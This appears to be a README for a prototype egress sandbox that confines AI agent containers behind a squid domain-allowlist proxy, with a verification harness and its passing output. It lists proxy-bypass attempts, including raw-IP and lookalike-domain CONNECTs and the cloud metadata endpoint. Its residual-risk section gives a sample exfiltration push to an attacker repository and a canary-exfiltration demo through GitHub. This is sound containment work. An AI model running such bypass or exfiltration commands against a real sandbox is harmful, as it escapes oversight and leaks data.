# Domain-allowlisted egress (TECH-98)

The model-only sandbox in this repo confines an orchestrator to **one** destination
through a URL-**path** allowlist. TECH-98 needs two more: `api.linear.app` for the
orchestrator and GitHub for the workers that push branches and open PRs. Both are
HTTPS, and that breaks the existing mechanism outright. This is the prototype that
replaces it — a **domain** allowlist on an HTTP `CONNECT` proxy — plus the harness
that shows it cannot be walked around.

> `./verify-egress.sh` — **40 checks, 0 failures**; 41 with `MODEL_CHAT=1`, which
> adds one real inference call (captured output below)

Everything here is namespaced `p2-*` so it runs beside the model-only sandbox
(`hermes-isolated` / `ollama-gate`) without touching it. Re-running
`verify-sandbox.sh` afterwards still reports 33 passed, 0 failed.

## Why path filtering does not transfer to HTTPS

`ollama-gate.conf` can read `/api/pull` and refuse it because the local model API is
**plaintext HTTP**: nginx terminates the connection, sees the request line, and
decides. Nothing about that survives TLS.

What a container sends to a proxy for an HTTPS URL is:

```
CONNECT api.linear.app:443 HTTP/1.1
```

That is the whole of it. The method, the path, the headers, the body and the response
are inside the TLS session that is set up *after* the tunnel opens. A proxy that has
not terminated TLS can filter on exactly two things: the **host** and the **port**.

The alternative is to terminate TLS — install a proxy CA in the container, decrypt,
re-encrypt. That buys path-level control and costs a great deal:

- every byte of the agent's traffic exists in plaintext inside the proxy,
- the proxy holds a CA the container trusts, so a compromised proxy is a
  credential-harvesting position (this traffic carries GitHub and Linear tokens),
- clients that pin certificates or use mutual TLS break,
- the "tiny config surface" argument for the gate disappears.

So the allowlist moves from paths to domains, and the proxy stays a blind tunnel. It
is a **coarser** control than the model gate's, and that is the honest trade: the
model gate can say "inference yes, model upload no" on the same host, while the
egress proxy can only say "github.com yes". The exfiltration consequence of that is
in [Residual risk](#residual-risk), and it is not a footnote.

## Component choice: squid

| Candidate | Verdict |
|---|---|
| **squid 6.9** (chosen) | `dstdomain` from a file, `SSL_ports`, method and source ACLs, ordered `http_access` rules, and a one-line-per-attempt log that doubles as the audit trail. Answers a denied `CONNECT` with a real **403**, so a refusal is measurable and distinguishable from a broken network. Alpine package is ~21 MB built. |
| tinyproxy | Smaller, but filtering is a regex list with `FilterDefaultDeny`, i.e. the allowlist is a regex — easy to write `github.com` and accidentally match `github.com.attacker.example`. No source ACL granularity and a much weaker log. |
| SNI-based filter (nginx `stream` + `ssl_preread`, or sniproxy) | No proxy env vars needed, which is appealing — but it filters on the SNI the **client** chooses, and the client here is the adversary. A TLS `ClientHello` with `SNI: github.com` to any IP, or no SNI at all, defeats it. Fine for tidiness, not for containment. |
| Deny-by-iptables on a routed network | Requires the sandbox network to have a gateway, i.e. giving up `--internal`. The single strongest property of the existing design is that there is no route at all; an IP-based filter is also the wrong unit for CDN-hosted hosts. |

The decisive property is not squid's feature list, it is that **the proxy env vars are
not what enforces anything**. They are a convenience for well-behaved clients. The
enforcement is the absent route.

## Design

```
   ┌──────────────────────────────┐
   │  p2-agent  (orchestrator /   │  network: p2-egress-isolated  (--internal)
   │  worker)  cap-drop ALL       │  no gateway · no route · no outbound DNS
   │  HTTPS_PROXY=p2-egress-proxy │  NO_PROXY=p2-model-gate
   └───────┬──────────────┬───────┘
           │              │
           │              └──────────────► ┌────────────────────────┐
           │       plaintext HTTP,         │  p2-model-gate (nginx) │
           │       PATH allowlist          │  ollama-gate.conf,     │
           │                               │  byte-identical        │
           │                               └───────────┬────────────┘
           ▼  CONNECT host:443                         ▼ host.docker.internal:11434
   ┌──────────────────────────────┐              Ollama on the host
   │  p2-egress-proxy  (squid)    │  networks: p2-egress-isolated + bridge
   │  DOMAIN allowlist, 443 only  │  read-only rootfs · ip_forward=0 · no caps
   │  CONNECT only · src-pinned   │
   └──────────────┬───────────────┘
                  ▼
        api.linear.app · github.com · api.github.com · codeload.github.com
```

Two gates, two mechanisms, one boundary:

- **Path allowlist, plaintext HTTP** → the local model. Unchanged; the same
  `ollama-gate.conf` file is mounted into `p2-model-gate`.
- **Domain allowlist, TLS tunnels** → the internet. New.
- **`--internal` network** → the reason either matters. No container on it has a
  route anywhere; both gates are dual-homed and are the only ways out.

`NO_PROXY` keeps model traffic off the egress proxy. That is wiring, not security —
the egress proxy refuses to tunnel to the model gate anyway (verified), because a
CONNECT-only proxy with a four-host allowlist has nothing to say about it.

## The allowlist, determined empirically

Method: set the allowlist to `api.linear.app` + `github.com` only, then run real
operations from inside the container and read squid's log for `TCP_DENIED`.

```
$ git ls-remote https://github.com/octocat/Hello-World.git      -> works
$ git clone --depth 1 https://github.com/octocat/Hello-World    -> works
$ curl .../info/refs?service=git-receive-pack                   -> 401 (auth challenge)
$ git push origin HEAD:refs/heads/p2-egress-probe               -> reaches GitHub, 401
$ curl https://api.github.com/rate_limit                        -> blocked
$ curl https://codeload.github.com/.../tar.gz/...               -> blocked
```

squid's log for that run — every git operation used one host:

```
1786466119.429   2000 172.24.0.4 TCP_TUNNEL/200 232186 CONNECT github.com:443 - HIER_DIRECT/140.82.121.3 -
1786466120.962   1452 172.24.0.4 TCP_TUNNEL/200 5601   CONNECT github.com:443 - HIER_DIRECT/140.82.121.3 -
1786466121.665    605 172.24.0.4 TCP_TUNNEL/200 3706   CONNECT github.com:443 - HIER_DIRECT/140.82.121.3 -
1786466122.285    534 172.24.0.4 TCP_TUNNEL/200 3704   CONNECT github.com:443 - HIER_DIRECT/140.82.121.3 -
1786466122.385      0 172.24.0.4 TCP_DENIED/403 3781   CONNECT api.github.com:443 - HIER_NONE/- text/html
1786466122.485      0 172.24.0.4 TCP_DENIED/403 3796   CONNECT codeload.github.com:443 - HIER_NONE/- text/html
```

| Host | Needed for | Evidence |
|---|---|---|
| `api.linear.app` | Linear GraphQL API | measured: TLS up, HTTP 400 to an unauthenticated `GET /graphql` |
| `github.com` | **all of git over HTTPS** — clone, fetch, ls-remote, **and push** | measured: shallow clone, full ref listing, and the `git-receive-pack` handshake all tunnel to `github.com:443` and nothing else |
| `api.github.com` | opening a PR (`gh pr create`, REST/GraphQL) | measured: refused under the narrow list, 200 once allowed. That `gh` uses this host is documentation, not something this prototype exercised end to end — no credentials were used |
| `codeload.github.com` | tarball/zip downloads (`gh release download`, `pip install git+https` extras) | measured reachable; **not** used by clone or push. Drop it unless something in the fleet needs it |

**A git push over HTTPS needs `github.com:443` and nothing else.** The commonly
assumed extras are not involved: packfiles are served by `github.com` itself over
smart HTTP, `codeload` only serves archives, and `objects.githubusercontent.com` /
`raw.githubusercontent.com` serve raw content and asset redirects. `git push` was
verified up to GitHub's `401` auth challenge — the request left the container,
crossed the tunnel and was answered by GitHub. Credentials were deliberately not
supplied, so the authenticated `POST /git-receive-pack` that follows was not run; it
reuses the same host and connection.

Deliberately **not** allowlisted, each of which will fail loudly if TECH-98 needs it:

- **Git LFS** — objects go to `github-cloud.s3.amazonaws.com`. An allowlist entry for
  an S3 bucket host is a wide-open write channel; add it only knowingly.
- **`gh auth login` device flow** — uses `github.com`, so it works; anything
  OAuth-callback-based will not.
- **Package registries** (npm, PyPI, RubyGems, Gemfury). Workers that install
  dependencies need their own entries. Prefer baking dependencies into the worker
  image so the allowlist stays at four hosts.

## Bypasses closed

`http_access` is evaluated in order, and each deny line is a named attack:

| Rule | Closes |
|---|---|
| `deny !agent_net` | squid listens on `0.0.0.0`; without this, every container on the default bridge has a free open proxy. The subnet is generated from the real network by `setup-egress.sh`. |
| `deny ip_literal` | `CONNECT 1.1.1.1:443` — skipping DNS so no `dstdomain` rule can match. Covers IPv4 and IPv6 literals. Also blocks `CONNECT 140.82.121.4:443`, i.e. github.com's *own* IP: the allowlist is a name check, so a name is required. |
| `deny !CONNECT` | the proxy fetching a URL on the agent's behalf — including `http://169.254.169.254/…` (cloud metadata) and `http://host.docker.internal:11434/api/pull`. The proxy tunnels or it refuses; it never originates a request. |
| `deny CONNECT !SSL_ports` | `CONNECT github.com:22` (ssh, hence port forwarding), and `CONNECT host.docker.internal:27017`. Port 443 only. |
| `allow allowed_domains` | exact hostnames from a read-only file. No leading-dot wildcards, so `github.com.attacker.example` does not match — the harness checks that no wildcard has crept in. |
| `deny all` | default deny. |

And, underneath all of it: the network has no gateway, so an agent that never reads
`HTTPS_PROXY` has nowhere to go. Measured as `ENETUNREACH` (errno 101) against ports
that genuinely listen, not as a DNS failure.

## Verification

```
$ MODEL_CHAT=1 ./verify-egress.sh; echo "exit=$?"

TOPOLOGY
  PASS  p2-egress-isolated is --internal (no gateway, no route out, no outbound DNS)
  PASS  p2-agent is on p2-egress-isolated only
  PASS  p2-agent has no NET_ADMIN (cannot install a route)
  PASS  p2-egress-proxy is dual-homed (the single hole, by design)

POSITIVE CONTROLS  (if these fail, every negative below is void)
  PASS  the TCP probe can detect an open port (p2-egress-proxy:3128 reachable)
  PASS  allowed domain reachable through the proxy: https://github.com -> 200
  PASS  allowed domain reachable through the proxy: api.linear.app -> 400 (TLS up)
  PASS  allowed domain tunnels: CONNECT api.github.com:443 -> 200
  PASS  allowed domain tunnels: CONNECT codeload.github.com:443 -> 200

BYPASS: NO DIRECT ROUTE WITH THE PROXY IGNORED
  PASS  no route to github.com by raw IP (140.82.121.4:443, SHUT:101) - a port that genuinely listens, so this is route-level
  PASS  no route to 1.1.1.1:443 by raw IP (SHUT:101)
  PASS  no route to outbound DNS (8.8.8.8:53, SHUT:101)
  PASS  no route to host services (host.docker.internal:27017, SHUT:dns)
  PASS  no route to host services by host LAN IP (192.168.178.102:27017, SHUT:101)
  PASS  agent cannot resolve github.com (the proxy does DNS, the agent never does)
  PASS  curl --noproxy to github.com's IP fails (no route)
  PASS  with proxy vars unset, https://example.com fails

DOMAIN ALLOWLIST  (refusals must come FROM THE PROXY, i.e. 403)
  PASS  non-allowed domain refused by the proxy: CONNECT example.com:443 -> 403
  PASS  raw-IP CONNECT refused: CONNECT 1.1.1.1:443 -> 403 (DNS cannot be skipped)
  PASS  raw-IP CONNECT to an ALLOWED host's IP refused (140.82.121.4:443 -> 403)
  PASS  IPv6-literal CONNECT refused
  PASS  lookalike domain refused (github.com.p2-not-github.example)
  PASS  non-443 port refused on an allowed domain (CONNECT github.com:22 -> 403)
  PASS  proxy will not tunnel to host services (host.docker.internal:27017 -> 403)
  PASS  plain-HTTP fetch refused even for an allowed domain (CONNECT-only proxy)
  PASS  link-local metadata endpoint refused

PROXY IS NOT AN OPEN PROXY FOR THE REST OF THE HOST
  PASS  a bridge container reaches the proxy but is refused (403) - not an open proxy

PROXY HARDENING
  PASS  proxy ip_forward=0 (cannot route even if the agent gained NET_ADMIN)
  PASS  proxy rootfs read-only (cannot install or rewrite its own config)
  PASS  allowlist mounted read-only
  PASS  proxy config ends in default-deny
  PASS  allowlist has no wildcard entries (exact hosts only)

GIT OVER HTTPS THROUGH THE PROXY
  PASS  git ls-remote works through the proxy (refs/heads/master listed)
  PASS  git clone --depth 1 works through the proxy
  PASS  git-receive-pack endpoint reached through the proxy (HTTP 401, github.com only)

LOCAL MODEL PATH UNCHANGED  (path allowlist, separate from the egress proxy)
  PASS  model gate reachable: GET /api/tags -> 200
  PASS  model gate still denies /api/pull (indirect internet egress)
  PASS  model gate still default-denies unknown paths
  PASS  inference works through the model gate (200)
  PASS  egress proxy refuses to tunnel to the model gate (concerns stay separate)

AUDIT TRAIL
  PASS  proxy logged 33 denied attempts (independent record of what was tried)

RESULT: 41 passed, 0 failed

exit=0
```

Three things the harness insists on, following `verify-sandbox.sh`:

- **Positive controls first.** An allowed domain must come back reachable and the TCP
  probe must be able to see an open port. If either fails, the negatives below prove
  nothing and the run fails rather than reporting a clean sweep.
- **Refusals must be attributable.** "Blocked by the allowlist" and "the network is
  broken" look identical to `curl`, which reports `%{http_code} = 000` for a
  `CONNECT` the proxy answered with 403. The bypass checks therefore speak the proxy
  protocol directly with `python3` sockets and read the status line, so a `403` is a
  measured refusal by a working proxy.
- **The bypass tests ignore the proxy on purpose.** `--noproxy '*'`, `env -u
  HTTPS_PROXY`, raw IPs, and `connect_ex` errnos. `/dev/tcp` is never used — it is a
  bash feature, these images run `ash`, and it fails identically whether a port is
  open or blocked (RESULTS.md §7).

## Residual risk

### A domain allowlist does not stop exfiltration to an allowed domain

This is the part TECH-98 must not misread. `github.com` is on the allowlist because
workers push branches to it. Pushing a branch **is** an arbitrary write of arbitrary
bytes to a remote of the agent's choosing. Nothing in this design distinguishes

```
git push origin HEAD:refs/heads/TECH-98-fix     # intended
git push https://github.com/attacker/dump.git   # exfiltration
```

Both are `CONNECT github.com:443`. The proxy cannot see the repository, the branch,
the payload, or even the HTTP method. Demonstrated with a harmless canary rather than
asserted — 114 bytes of agent-chosen data left the container inside a URL:

```
$ docker exec p2-agent curl -s -o /dev/null -w '%{http_code} %{size_request}\n' \
    https://github.com/p2-exfil-demo/U0VDUkVULUNBTkFSWS1hYmMxMjM=
404 114

# and all the proxy logged:
1786466930.430  738 172.24.0.4 TCP_TUNNEL/200 4726 CONNECT github.com:443 - HIER_DIRECT/140.82.121.4 -
```

The 404 is irrelevant; the bytes reached GitHub. A gist, an issue comment, a fork, or
a branch in an attacker's repo are all the same channel with a real destination at the
end, and `api.linear.app` is a second one (issue descriptions are free-text). The
same is true of any allowlist entry that accepts writes.

So the domain allowlist is not a data-loss control. It is a **blast-radius** control:
it stops the agent reaching the LAN, host services, cloud metadata, arbitrary IPs,
package registries and command-and-control hosts, and it produces a log of every
destination attempted. What actually bounds exfiltration to GitHub is orthogonal:

- **Credential scope.** A push token restricted to the specific repos the fleet may
  write to, ideally a GitHub App installation token, short-lived, no `gist` scope.
  The allowlist decides which *hosts*; the token decides which *repos*.
- **What the container is given.** Anything the agent cannot read, it cannot leak.
  Mount one repo, not the workspace; do not pass the host's `~/.gitconfig`,
  `~/.ssh` or unrelated tokens.
- **Review of what is pushed.** Branch protection and PR review remain the last line;
  an agent-authored diff is untrusted input.

### Other honest limits

- **The proxy is dual-homed**, like the model gate — the one component touching both
  sides. Hence read-only rootfs, `cap-drop ALL`, `ip_forward=0`, no caching, and a
  config file of a few dozen lines. It is also the natural place for a TLS-intercept
  mistake to be made later; don't.
- **Two dual-homed components now**, not one. `p2-model-gate` also touches the
  bridge, and its `/api/pull` denial is what stops it becoming an indirect internet
  egress. That rule is now load-bearing for two reasons instead of one.
- **DNS is trusted.** The proxy resolves names via Docker's resolver and the host's.
  An attacker who controls DNS answers can point `github.com` at their own address;
  nothing here pins certificates or addresses. The agent cannot influence DNS itself
  (it has no resolver reachable at all), which is the meaningful half.
- **No content inspection at all.** Deliberate — see the TLS-termination trade-off
  above — but it means the proxy log tells you *where*, never *what*.
- **Compute and rate.** The model gate rate-limits inference; the egress proxy does
  not rate-limit tunnels. A loop hammering GitHub would be visible in the log and
  eventually rate-limited by GitHub, not by us. Add `delay_pools` if that matters.
- **Human error still dominates.** Every boundary is a launch flag. A worker started
  with `--network bridge` has full egress and nothing warns you — the reason
  `run-hermes.sh` exists for the model sandbox, and the reason this prototype's
  preflight belongs in whatever launches TECH-98's workers.

## Findings worth keeping

Things that cost time here, none of them obvious:

**`curl` reports `000`, not `403`, for a refused `CONNECT`.** It fails with exit 56
and no HTTP code, which is exactly what it reports when the proxy is unreachable. A
check written as "expect 000" therefore passes when the proxy is *down* — a false
pass of the same family as the `/dev/tcp` one in RESULTS.md §7. The harness speaks
the proxy protocol with raw sockets where attribution matters.

**`dstdomain` never matches an IP literal, so the default-deny is doing that work
silently.** Relying on it is fine until someone adds a broad `allow`. An explicit
`deny ip_literal` line makes "no DNS-free CONNECT" a stated rule that can be tested,
and the test is worth having: `CONNECT <github's own IP>:443` must be refused too.

**squid listens on `0.0.0.0` and has no source restriction by default.** Dual-homing
it therefore hands an open proxy to every container on the default bridge — on this
machine that is a dozen unrelated dev containers. The `agent_net` ACL is generated
from the network's real subnet at setup time; without it the sandbox would be a
service to everything else on the host.

**An unprivileged squid cannot write to Docker's stdout.** It drops to user `squid`,
Docker's stdout/stderr are root-owned pipes, and `cache_log stdio:/dev/stderr` fails
with `(13) Permission denied` — after which squid runs but logs nowhere, so the audit
trail is silently absent. Fixed by logging to a tmpfs and having the entrypoint
`tail -F` it as root.

**`NO_PROXY` matters for the local model.** With `HTTPS_PROXY`/`HTTP_PROXY` set,
proxy-aware clients send *plaintext* model calls to the egress proxy too, where a
CONNECT-only policy denies them. The model path breaks in a way that looks like a
model problem. `NO_PROXY=p2-model-gate,localhost,127.0.0.1`.

**Docker Desktop's internal network gives `ENETUNREACH` immediately, not a timeout.**
Useful: the probes return in milliseconds, so the whole bypass section is fast, and
errno 101 is a much better artifact than "the connection timed out".

## Running it

```bash
./setup-egress.sh                    # network, proxy, model gate, worker stand-in
./verify-egress.sh; echo "exit=$?"   # expect: 40 passed, 0 failed / exit=0
MODEL_CHAT=1 ./verify-egress.sh      # 41 - adds one real inference call
./setup-egress.sh teardown           # removes every p2-* resource
```

To change what is reachable, edit `egress-allowed-domains.txt` and
`docker restart p2-egress-proxy`. The file is the whole policy; the harness reads it
too, so an added host is checked for reachability and a wildcard entry fails the run.

| File | Purpose |
|---|---|
| `setup-egress.sh` | Builds the `p2-*` sandbox; `teardown` removes it |
| `egress-proxy.conf` | squid: domain allowlist, CONNECT-only, ordered denies |
| `egress-allowed-domains.txt` | The allowlist itself — the entire reachable internet |
| `egress-proxy.Dockerfile` | alpine + squid, ~21 MB, logs via tmpfs to stdout |
| `egress-probe.Dockerfile` | Worker stand-in: git, curl, python3, ~67 MB |
| `verify-egress.sh` | Host-side verification, incl. the bypass tests |

Tested on Docker Desktop 29.3.1 (macOS, Apple Silicon), squid 6.9, images 21 MB and
67 MB, ~0.2 GB of the VM's 12 GB free disk. Both `p2-*` images are removed by
`teardown`.
